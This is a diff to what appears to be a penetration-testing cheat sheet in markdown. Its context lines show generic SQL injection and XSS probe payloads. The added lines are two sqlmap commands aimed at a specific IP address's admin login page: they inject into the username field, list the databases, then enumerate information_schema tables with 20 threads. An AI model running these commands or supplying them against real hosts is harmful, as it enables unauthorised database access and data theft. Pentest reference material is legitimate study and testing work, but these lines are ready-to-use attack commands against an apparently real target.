@@ -119,6 +119,22 @@ sqlmap -u "http://target.com/item?id=1" --batch --random-agent
 ' UNION SELECT NULL,NULL--
 ```
 
+```
+sqlmap -u "http://59.110.221.188:8080/admin/login" \
+  --data="username=admin&password=whatever" \
+  -p username \
+  --batch \
+  --dbs
+```
+```
+sqlmap -u "http://59.110.221.188:8080/admin/login" \
+  --data="username=admin&password=whatever" \
+  -p username \
+  --batch \
+  -D information_schema --tables --time-sec=1 --threads 20
+```
+
+
 ### 🔹 XSS
 ```html
 "><script>alert(1)</script>
